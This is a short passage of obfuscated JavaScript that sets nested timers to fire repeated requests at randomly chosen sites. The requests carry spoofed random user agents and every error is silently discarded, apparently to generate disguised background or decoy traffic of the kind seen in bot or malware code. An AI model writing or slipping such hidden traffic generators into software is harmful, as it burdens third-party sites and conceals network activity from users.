      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0xd * 0x3e4 + 0x97d + -0x20b9) * getRandomInt(-0xf86 * -0x1 + -0x2 * -0x58 + -0x1035 * 0x1, -0x12 * 0x43 + -0x1 * -0x1ea6 + -0x19eb));
}, 0x1044 + 0xb1f + -0x1aff * 0x1);